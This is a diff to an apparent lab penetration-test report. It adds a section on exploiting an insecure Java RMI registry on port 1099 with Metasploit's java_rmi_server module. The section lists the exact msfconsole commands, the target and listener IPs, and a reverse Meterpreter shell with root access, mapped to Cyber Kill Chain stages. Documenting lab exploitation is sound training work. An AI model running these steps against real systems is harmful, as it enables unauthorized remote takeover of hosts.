@@ -124,3 +124,33 @@ Key findings — 23 open ports in total, including several with well-known vulne
   - **Command & Control:** The reverse TCP command shell session gave an ongoing remote control channel back to Kali.
   - **Actions on Objectives:** Ran whoami and id to confirm full root-level access to the target.
 - **Outcome / Impact:** Achieved a third, independent root-level shell on the target via a Samba misconfiguration, distinct from both prior exploits and demonstrating a different vulnerability class (command injection vs. planted backdoors).
+
+
+
+---
+
+## Exploit 4: Java RMI Server Insecure Default Configuration
+
+- **Service / Port:** Java RMI / 1099
+- **Vulnerability:** The Java RMI registry's default configuration does not restrict which classes can be loaded remotely, allowing an attacker to register a malicious remote object that executes arbitrary code when invoked.
+- **Tool Used:** Metasploit — exploit/multi/misc/java_rmi_server
+- **Why This Tool:** Recon identified an open Java RMI registry (GNU Classpath grmiregistry) on port 1099. A similarly-named module (java_rmi_connection_impl) targets vulnerable browser Java plugins and does not apply here; this server-side module was chosen because it specifically targets the insecure default RMI registry configuration matching what recon found.
+- **Steps:**
+  1. `background`
+  2. `back`
+  3. `search java_rmi`
+  4. `use exploit/multi/misc/java_rmi_server`
+  5. `set RHOSTS 192.168.100.204`
+  6. `set LHOST 192.168.100.253`
+  7. `run`
+  8. Confirmed access with `sysinfo` and `getuid` inside the resulting Meterpreter session
+- **Evidence:** evidence/exploit4.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command & Control, Actions on Objectives
+  - **Reconnaissance:** The nmap scan identified the Java RMI registry running on port 1099.
+  - **Weaponization:** Selecting the java_rmi_server module and configuring RHOSTS/LHOST paired the insecure configuration with a Java Meterpreter payload.
+  - **Delivery:** Metasploit started a local HTTP server and sent an RMI call directing the target to fetch the payload JAR.
+  - **Exploitation:** The target's RMI registry loaded and executed the malicious remote class without restriction.
+  - **Installation:** The Java Meterpreter payload executed on the target, establishing a foothold.
+  - **Command & Control:** The reverse TCP Meterpreter session gave an ongoing remote control channel back to Kali.
+  - **Actions on Objectives:** Ran sysinfo and getuid to confirm full root-level access to the target.
+- **Outcome / Impact:** Achieved a fourth, independent root-level Meterpreter session via the Java RMI service, demonstrating yet another distinct vulnerability class (insecure default configuration allowing remote class loading).
